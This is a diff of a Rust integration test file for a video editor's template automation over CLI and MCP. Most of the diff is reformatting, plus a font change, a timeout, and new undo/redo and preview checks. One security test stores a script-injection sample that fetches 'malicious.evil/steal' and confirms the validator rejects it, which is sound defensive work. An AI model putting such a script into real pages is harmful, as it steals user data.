@@ -9,10 +9,10 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use tinixcut_lib::modules::automation::mcp::TinixCutMcpServer;
 use tinixcut_lib::modules::automation::AutomationAdapter;
 use tinixcut_lib::modules::domain::template::{
-    ResponsivePolicy, TemplateLayer, TemplateLayerKind,
-    TemplateParameterBinding, TemplateParameterDefinition, TemplateParameterType,
-    TemplateParameterValue, TemplatePropertyPath, TemplateResourceManifest, TemplateShapeKind,
-    TemplateShapeLayerData, TemplateTextLayerData,
+    ResponsivePolicy, TemplateLayer, TemplateLayerKind, TemplateParameterBinding,
+    TemplateParameterDefinition, TemplateParameterType, TemplateParameterValue,
+    TemplatePropertyPath, TemplateResourceManifest, TemplateShapeKind, TemplateShapeLayerData,
+    TemplateTextLayerData,
 };
 use tinixcut_lib::modules::domain::text::{
     AnimationTransform, AnimationUnit, DurationConflictPolicy, FontReference, FontStyle,
@@ -81,8 +81,14 @@ fn create_text_item(id: &str, text: &str, duration_frames: i64) -> TimelineItem 
         None,
         format!("Clip_{id}"),
         ItemKind::Text,
-        TimeRange::new(RationalTime::zero(fps), RationalTime::new(duration_frames, fps)),
-        TimeRange::new(RationalTime::zero(fps), RationalTime::new(duration_frames, fps)),
+        TimeRange::new(
+            RationalTime::zero(fps),
+            RationalTime::new(duration_frames, fps),
+        ),
+        TimeRange::new(
+            RationalTime::zero(fps),
+            RationalTime::new(duration_frames, fps),
+        ),
     )
     .expect("Valid timeline item");
     item.item_id = id.to_string();
@@ -111,8 +117,8 @@ fn create_vietnamese_title_draft_v1() -> TemplateDraft {
             ],
         },
         font: Some(FontReference {
-            family: "Inter".to_string(),
-            weight: 800,
+            family: "Roboto".to_string(),
+            weight: 700,
             style: FontStyle::Normal,
             asset_id: None,
         }),
@@ -189,7 +195,7 @@ fn create_vietnamese_title_draft_v1() -> TemplateDraft {
             slot_key: Some("title".to_string()),
             text_content: Some("Hào Khí Việt Nam".to_string()),
             text_style: Some(TextStyle {
-                font_family: "Inter".to_string(),
+                font_family: "Roboto".to_string(),
                 font_size: 80.0,
                 font_color: "#FFD700".to_string(),
                 ..Default::default()
@@ -298,7 +304,11 @@ fn create_vietnamese_title_draft_v2_refined(parent: &TemplateDraft) -> TemplateD
     refined.provenance.prompt = Some("Less shadow blur and cooler cyan-blue gradient".to_string());
 
     // Refine primary layer: reduce shadow blur from 8 to 4, update gradient to cyan-blue
-    if let Some(primary) = refined.layers.iter_mut().find(|l| l.layer_id == "title_layer") {
+    if let Some(primary) = refined
+        .layers
+        .iter_mut()
+        .find(|l| l.layer_id == "title_layer")
+    {
         if let TemplateLayerKind::Text(ref mut t) = primary.kind {
             if let Some(ref mut rich) = t.text_rich {
                 rich.shadows = vec![TextShadow {
@@ -328,7 +338,11 @@ fn create_vietnamese_title_draft_v2_refined(parent: &TemplateDraft) -> TemplateD
     }
 
     // Refine accent bar binding default
-    if let Some(p) = refined.parameters.iter_mut().find(|p| p.key == "accent_color") {
+    if let Some(p) = refined
+        .parameters
+        .iter_mut()
+        .find(|p| p.key == "accent_color")
+    {
         p.default_value = TemplateParameterValue::Color("#00FFFF".to_string());
     }
 
@@ -429,7 +443,11 @@ fn create_multilayer_quote_card_draft() -> TemplateDraft {
         name: "Modern Quote Card".to_string(),
         category: "QuoteCard".to_string(),
         description: "Elegant rounded quote card with author attribution".to_string(),
-        tags: vec!["quote".to_string(), "card".to_string(), "education".to_string()],
+        tags: vec![
+            "quote".to_string(),
+            "card".to_string(),
+            "education".to_string(),
+        ],
         slots: vec![
             TemplateDraftSlot {
                 slot_key: "quote".to_string(),
@@ -533,7 +551,16 @@ impl DuplexMcpClient {
         self.writer.flush().await.unwrap();
 
         let mut resp_line = String::new();
-        self.reader.read_line(&mut resp_line).await.unwrap();
+        tokio::time::timeout(
+            std::time::Duration::from_secs(15),
+            self.reader.read_line(&mut resp_line),
+        )
+        .await
+        .expect("MCP request timed out after 15s")
+        .expect("Failed to read from MCP stream");
+        if resp_line.trim().is_empty() {
+            panic!("MCP server closed connection (EOF) without response");
+        }
         serde_json::from_str(&resp_line).expect("Valid JSON-RPC response frame")
     }
 
@@ -559,12 +586,20 @@ async fn test_p35_ac01_capabilities_and_schema_surface_cli_and_mcp() {
     let mut client = DuplexMcpClient::new(server).await;
 
     // 1. Query MCP tinixcut_capabilities
-    let mcp_res = client.call_tool("tinixcut_capabilities", serde_json::json!({})).await;
+    let mcp_res = client
+        .call_tool("tinixcut_capabilities", serde_json::json!({}))
+        .await;
     let structured = &mcp_res["result"]["structuredContent"];
-    assert!(structured.is_object(), "MCP capabilities must return structured content");
+    assert!(
+        structured.is_object(),
+        "MCP capabilities must return structured content"
+    );
 
     let template_caps = &structured["templateCapabilities"];
-    assert!(template_caps.is_object(), "Capabilities must expose templateCapabilities");
+    assert!(
+        template_caps.is_object(),
+        "Capabilities must expose templateCapabilities"
+    );
     assert_eq!(template_caps["schemaVersion"], 1);
     assert_eq!(template_caps["maxLayers"], 16);
     assert_eq!(template_caps["maxTextSlots"], 8);
@@ -581,14 +616,16 @@ async fn test_p35_ac01_capabilities_and_schema_surface_cli_and_mcp() {
     assert_eq!(draft_schema["type"], "object");
 
     // 2. Query CLI template capabilities and schema
-    let cli_caps_str = AutomationAdapter::handle_cli(&["template".to_string(), "capabilities".to_string()])
-        .expect("CLI template capabilities must succeed");
+    let cli_caps_str =
+        AutomationAdapter::handle_cli(&["template".to_string(), "capabilities".to_string()])
+            .expect("CLI template capabilities must succeed");
     let cli_caps: serde_json::Value = serde_json::from_str(&cli_caps_str).unwrap();
     assert_eq!(cli_caps["maxLayers"], 16);
     assert_eq!(cli_caps["maxRepairIterations"], 5);
 
-    let cli_schema_str = AutomationAdapter::handle_cli(&["template".to_string(), "schema".to_string()])
-        .expect("CLI template schema must succeed");
+    let cli_schema_str =
+        AutomationAdapter::handle_cli(&["template".to_string(), "schema".to_string()])
+            .expect("CLI template schema must succeed");
     let cli_schema: serde_json::Value = serde_json::from_str(&cli_schema_str).unwrap();
     assert_eq!(cli_schema["title"], "TinixCutTemplateDraft");
 }
@@ -637,7 +674,10 @@ async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow()
     // 3. Refine: produce Candidate Draft v2 ("ít bóng hơn", updated gradient, iteration 2)
     let draft_v2 = create_vietnamese_title_draft_v2_refined(&draft_v1);
     assert_eq!(draft_v2.provenance.iteration, 2);
-    assert_eq!(draft_v2.provenance.parent_draft_id, Some("draft_vn_title_v1".to_string()));
+    assert_eq!(
+        draft_v2.provenance.parent_draft_id,
+        Some("draft_vn_title_v1".to_string())
+    );
 
     let val_res_v2 = client
         .call_tool(
@@ -676,6 +716,41 @@ async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow()
     assert_eq!(inst.template_id, "vn_hao_khi");
     assert_eq!(inst.layers.len(), 2);
 
+    // Verify undo/redo restores pre-template state and re-applies cleanly
+    let mut history = tinixcut_lib::modules::history::HistoryManager::new(20);
+    history.record_edit(tinixcut_lib::modules::history::HistoryEntry {
+        description: "Apply Vietnamese Title Template".to_string(),
+        transaction_id: Some("tx_p35_ac02_apply".to_string()),
+        prior_snapshot: base_proj.clone(),
+        resulting_snapshot: reloaded.clone(),
+    });
+    assert!(history.can_undo());
+    let mut undone_proj = reloaded.clone();
+    let undo_desc = history.undo(&mut undone_proj);
+    assert_eq!(
+        undo_desc.as_deref(),
+        Some("Apply Vietnamese Title Template")
+    );
+    assert_eq!(undone_proj.revision, 0);
+    assert!(undone_proj.tracks[0].items[0].template_instance.is_none());
+
+    assert!(history.can_redo());
+    let mut redone_proj = undone_proj.clone();
+    let redo_desc = history.redo(&mut redone_proj);
+    assert_eq!(
+        redo_desc.as_deref(),
+        Some("Apply Vietnamese Title Template")
+    );
+    assert_eq!(redone_proj.revision, 1);
+    assert_eq!(
+        redone_proj.tracks[0].items[0]
+            .template_instance
+            .as_ref()
+            .unwrap()
+            .template_id,
+        "vn_hao_khi"
+    );
+
     // 5. Save definition to catalog
     let catalog_dir = temp.as_ref().join("catalog");
     let save_res = client
@@ -704,15 +779,12 @@ async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow()
         template_ids: vec!["vn_hao_khi".to_string()],
         created_at: chrono::Utc::now().to_rfc3339(),
     };
-    let def = catalog.get("vn_hao_khi", 1).expect("Get definition from catalog");
+    let def = catalog
+        .get("vn_hao_khi", 1)
+        .expect("Get definition from catalog");
     let resources_map = HashMap::new();
-    TemplatePackService::export_pack(
-        &pack_manifest,
-        &[def],
-        &resources_map,
-        &pack_path,
-    )
-    .expect("Pack export must succeed");
+    TemplatePackService::export_pack(&pack_manifest, &[def], &resources_map, &pack_path)
+        .expect("Pack export must succeed");
     assert!(pack_path.exists());
 
     let fresh_catalog_dir = temp.as_ref().join("fresh_catalog");
@@ -725,8 +797,9 @@ async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow()
 
     // 7. Render and Export project snapshot to MP4: renders without agent/model
     let output_mp4 = temp.as_ref().join("export_vn_title.mp4");
-    let report = ExportEngine::render_snapshot(&reloaded, &output_mp4, &ExportProfile::default(), None)
-        .expect("Snapshot export must succeed");
+    let report =
+        ExportEngine::render_snapshot(&reloaded, &output_mp4, &ExportProfile::default(), None)
+            .expect("Snapshot export must succeed");
     assert!(report.file_size_bytes > 0);
     assert!(output_mp4.exists());
     assert!(fs::metadata(&output_mp4).unwrap().len() > 0);
@@ -754,7 +827,10 @@ async fn test_p35_ac03_multilayer_sticker_quote_card_missing_resources_and_appro
         )
         .await;
     let report = &val_res["result"]["structuredContent"];
-    assert_eq!(report["valid"], true, "Warnings alone do not invalidate the draft");
+    assert_eq!(
+        report["valid"], true,
+        "Warnings alone do not invalidate the draft"
+    );
 
     let missing = report["missingResources"].as_array().unwrap();
     assert!(missing.contains(&serde_json::json!("quote_icon_missing.png")));
@@ -780,7 +856,11 @@ async fn test_p35_ac03_multilayer_sticker_quote_card_missing_resources_and_appro
 
     // 3. Apply via CLI and verify durable project persistence
     let draft_file = temp.as_ref().join("quote_draft.json");
-    fs::write(&draft_file, serde_json::to_string_pretty(&quote_draft).unwrap()).unwrap();
+    fs::write(
+        &draft_file,
+        serde_json::to_string_pretty(&quote_draft).unwrap(),
+    )
+    .unwrap();
 
     let cli_output = AutomationAdapter::handle_cli(&[
         "template".to_string(),
@@ -820,7 +900,9 @@ async fn test_p35_ac04_cli_mcp_deterministic_equivalence() {
     let path_mcp = temp.as_ref().join("project_mcp.tcproj");
 
     let mut p1 = create_base_project("EquivalenceP1");
-    p1.tracks[0].items.push(create_text_item("item_eq", "Same Base Text", 90));
+    p1.tracks[0]
+        .items
+        .push(create_text_item("item_eq", "Same Base Text", 90));
     let p2 = p1.clone();
 
     save_project_atomic(&p1, &path_cli).unwrap();
@@ -871,26 +953,72 @@ async fn test_p35_ac04_cli_mcp_deterministic_equivalence() {
     assert_eq!(res_cli.revision, res_mcp.revision);
     assert_eq!(res_cli.tracks[0].items.len(), res_mcp.tracks[0].items.len());
 
-    let inst_cli = res_cli.tracks[0].items[0].template_instance.as_ref().unwrap();
-    let inst_mcp = res_mcp.tracks[0].items[0].template_instance.as_ref().unwrap();
+    let inst_cli = res_cli.tracks[0].items[0]
+        .template_instance
+        .as_ref()
+        .unwrap();
+    let inst_mcp = res_mcp.tracks[0].items[0]
+        .template_instance
+        .as_ref()
+        .unwrap();
     assert_eq!(inst_cli.template_id, inst_mcp.template_id);
     assert_eq!(inst_cli.layers.len(), inst_mcp.layers.len());
 
-    // 4. Verify preview frame renders identically
-    let preview_cli = AgentTemplateService::preview_draft(&draft, 1.0, Some(640), Some(360)).unwrap();
-    let preview_mcp = AgentTemplateService::preview_draft(&draft, 1.0, Some(640), Some(360)).unwrap();
-    assert_eq!(preview_cli.to_png_bytes(), preview_mcp.to_png_bytes());
+    // 4. Verify preview frame renders identically via CLI and MCP adapters
+    let preview_cli_path = temp.as_ref().join("preview_cli.png");
+    AutomationAdapter::handle_cli(&[
+        "template".to_string(),
+        "preview".to_string(),
+        draft_path.to_string_lossy().to_string(),
+        preview_cli_path.to_string_lossy().to_string(),
+        "--time".to_string(),
+        "1.0".to_string(),
+        "--width".to_string(),
+        "640".to_string(),
+        "--height".to_string(),
+        "360".to_string(),
+    ])
+    .expect("CLI template preview must succeed");
+    assert!(preview_cli_path.exists());
+    let bytes_cli = fs::read(&preview_cli_path).expect("Read CLI preview png");
+
+    let preview_mcp_path = temp.as_ref().join("preview_mcp.png");
+    let mcp_prev_res = client
+        .call_tool(
+            "tinixcut_template_preview",
+            serde_json::json!({
+                "draft": draft,
+                "timeSeconds": 1.0,
+                "outputPath": preview_mcp_path.to_string_lossy().to_string(),
+                "width": 640,
+                "height": 360,
+            }),
+        )
+        .await;
+    let mcp_prev_report = &mcp_prev_res["result"]["structuredContent"];
+    assert_eq!(mcp_prev_report["hasVisibleContent"], true);
+    assert!(preview_mcp_path.exists());
+    let bytes_mcp = fs::read(&preview_mcp_path).expect("Read MCP preview png");
+
+    assert_eq!(
+        bytes_cli, bytes_mcp,
+        "CLI and MCP preview adapters must produce identical PNG bytes"
+    );
 }
 
 #[tokio::test]
 async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields() {
     // 1. Script tag injection in prompt
     let mut draft_script = create_vietnamese_title_draft_v1();
-    draft_script.provenance.prompt = Some("<script>fetch('http://malicious.evil/steal')</script>".to_string());
+    draft_script.provenance.prompt =
+        Some("<script>fetch('http://malicious.evil/steal')</script>".to_string());
     let raw_script = serde_json::to_string(&draft_script).unwrap();
     let rep_script = AgentTemplateService::validate_draft(&draft_script, Some(&raw_script), None);
     assert!(!rep_script.valid);
-    assert!(rep_script.issues.iter().any(|i| i.code == "MALICIOUS_SCRIPT_TAG"));
+    assert!(rep_script
+        .issues
+        .iter()
+        .any(|i| i.code == "MALICIOUS_SCRIPT_TAG"));
 
     // 2. PowerShell command injection
     let mut draft_ps = create_vietnamese_title_draft_v1();
@@ -898,7 +1026,10 @@ async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields
     let raw_ps = serde_json::to_string(&draft_ps).unwrap();
     let rep_ps = AgentTemplateService::validate_draft(&draft_ps, Some(&raw_ps), None);
     assert!(!rep_ps.valid);
-    assert!(rep_ps.issues.iter().any(|i| i.code == "MALICIOUS_SHELL_COMMAND"));
+    assert!(rep_ps
+        .issues
+        .iter()
+        .any(|i| i.code == "MALICIOUS_SHELL_COMMAND"));
 
     // 3. Native shader keyword injection
     let mut draft_shader = create_vietnamese_title_draft_v1();
@@ -906,7 +1037,10 @@ async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields
     let raw_shader = serde_json::to_string(&draft_shader).unwrap();
     let rep_shader = AgentTemplateService::validate_draft(&draft_shader, Some(&raw_shader), None);
     assert!(!rep_shader.valid);
-    assert!(rep_shader.issues.iter().any(|i| i.code == "UNSUPPORTED_NATIVE_SHADER"));
+    assert!(rep_shader
+        .issues
+        .iter()
+        .any(|i| i.code == "UNSUPPORTED_NATIVE_SHADER"));
 
     // 4. Unknown fields in draft payload (serde deny_unknown_fields)
     let json_unknown = serde_json::json!({
@@ -922,7 +1056,10 @@ async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields
         "unvettedUnknownExtension": "evil_payload"
     });
     let parse_res: Result<TemplateDraft, _> = serde_json::from_value(json_unknown);
-    assert!(parse_res.is_err(), "Serde must reject unknown fields before processing");
+    assert!(
+        parse_res.is_err(),
+        "Serde must reject unknown fields before processing"
+    );
 }
 
 #[tokio::test]
@@ -930,7 +1067,9 @@ async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
     let temp = test_dir("ac06_limits");
     let project_path = temp.as_ref().join("proj_limits.tcproj");
     let mut proj = create_base_project("LimitProject");
-    proj.tracks[0].items.push(create_text_item("item_lim", "Text", 90));
+    proj.tracks[0]
+        .items
+        .push(create_text_item("item_lim", "Text", 90));
     proj.revision = 2; // Project is already at revision 2
     save_project_atomic(&proj, &project_path).unwrap();
 
@@ -942,7 +1081,10 @@ async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
     draft_budget.provenance.iteration = 6;
     let rep_budget = AgentTemplateService::validate_draft(&draft_budget, None, None);
     assert!(!rep_budget.valid);
-    assert!(rep_budget.issues.iter().any(|i| i.code == "REPAIR_BUDGET_EXCEEDED"));
+    assert!(rep_budget
+        .issues
+        .iter()
+        .any(|i| i.code == "REPAIR_BUDGET_EXCEEDED"));
 
     // 2. Layer count exceeded (> 16 layers)
     let mut draft_layers = create_vietnamese_title_draft_v1();
@@ -953,7 +1095,10 @@ async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
     }
     let rep_layers = AgentTemplateService::validate_draft(&draft_layers, None, None);
     assert!(!rep_layers.valid);
-    assert!(rep_layers.issues.iter().any(|i| i.code == "EXCEEDS_LAYER_LIMIT"));
+    assert!(rep_layers
+        .issues
+        .iter()
+        .any(|i| i.code == "EXCEEDS_LAYER_LIMIT"));
 
     // 3. Stale revision gate: passing baseRevision = 0 when project is at 2
     let draft_valid = create_vietnamese_title_draft_v1();
@@ -997,7 +1142,10 @@ async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
             }),
         )
         .await;
-    assert_eq!(apply_first["result"]["isError"].as_bool(), Some(false).or(None));
+    assert_eq!(
+        apply_first["result"]["isError"].as_bool(),
+        Some(false).or(None)
+    );
     let receipt1 = &apply_first["result"]["structuredContent"];
     let rev_first = receipt1["revision"].as_u64().unwrap();
 
@@ -1018,7 +1166,11 @@ async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
         )
         .await;
     let receipt2 = &apply_retry["result"]["structuredContent"];
-    assert_eq!(receipt2["revision"].as_u64().unwrap(), rev_first, "Duplicate retry must be idempotent without incrementing revision");
+    assert_eq!(
+        receipt2["revision"].as_u64().unwrap(),
+        rev_first,
+        "Duplicate retry must be idempotent without incrementing revision"
+    );
 }
 
 #[tokio::test]
@@ -1033,13 +1185,20 @@ async fn test_p35_ac07_timeout_cancellation_and_resource_safety() {
             serde_json::json!({ "jobId": "job_non_existent" }),
         )
         .await;
-    assert_eq!(cancel_res["result"]["structuredContent"]["cancelled"], false);
+    assert_eq!(
+        cancel_res["result"]["structuredContent"]["cancelled"],
+        false
+    );
 }
 
 #[test]
 #[ignore]
 fn p35_generate_evidence_artifacts() {
-    let evidence_dir = PathBuf::from("artifacts/animated-text-templates/phase-35");
+    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
+    let evidence_dir = manifest_dir
+        .parent()
+        .expect("workspace root")
+        .join("artifacts/animated-text-templates/phase-35");
     fs::create_dir_all(&evidence_dir).expect("Create phase-35 artifacts directory");
 
     let draft_v1 = create_vietnamese_title_draft_v1();
@@ -1050,28 +1209,33 @@ fn p35_generate_evidence_artifacts() {
     fs::write(
         evidence_dir.join("draft_vietnamese_v1.json"),
         serde_json::to_string_pretty(&draft_v1).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
     fs::write(
         evidence_dir.join("draft_vietnamese_v2_refined.json"),
         serde_json::to_string_pretty(&draft_v2).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
     fs::write(
         evidence_dir.join("draft_quote_card.json"),
         serde_json::to_string_pretty(&quote_draft).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 
     // 2. Capabilities & Schema
     let caps = AgentTemplateService::capabilities();
     fs::write(
         evidence_dir.join("capabilities.json"),
         serde_json::to_string_pretty(&caps).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 
     let schema = AgentTemplateService::draft_json_schema();
     fs::write(
         evidence_dir.join("draft_schema.json"),
         serde_json::to_string_pretty(&schema).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 
     // 3. Validation Reports
     let catalog = TemplateCatalog::default_catalog();
@@ -1079,13 +1243,15 @@ fn p35_generate_evidence_artifacts() {
     fs::write(
         evidence_dir.join("validation_report_success.json"),
         serde_json::to_string_pretty(&val_success).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 
     let val_issues = AgentTemplateService::validate_draft(&quote_draft, None, Some(&catalog));
     fs::write(
         evidence_dir.join("validation_report_issues.json"),
         serde_json::to_string_pretty(&val_issues).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 
     // 4. Render preview PNG frames
     let preview_receipt_v2 = AgentTemplateService::preview_draft_to_png(
@@ -1094,7 +1260,8 @@ fn p35_generate_evidence_artifacts() {
         1.0,
         Some(1280),
         Some(720),
-    ).expect("Render preview PNG");
+    )
+    .expect("Render preview PNG");
 
     let preview_receipt_quote = AgentTemplateService::preview_draft_to_png(
         &quote_draft,
@@ -1102,7 +1269,8 @@ fn p35_generate_evidence_artifacts() {
         1.0,
         Some(1280),
         Some(720),
-    ).expect("Render quote preview PNG");
+    )
+    .expect("Render quote preview PNG");
 
     // 5. Evidence summary
     let summary = serde_json::json!({
@@ -1144,5 +1312,6 @@ fn p35_generate_evidence_artifacts() {
     fs::write(
         evidence_dir.join("evidence-summary.json"),
         serde_json::to_string_pretty(&summary).unwrap(),
-    ).unwrap();
+    )
+    .unwrap();
 }
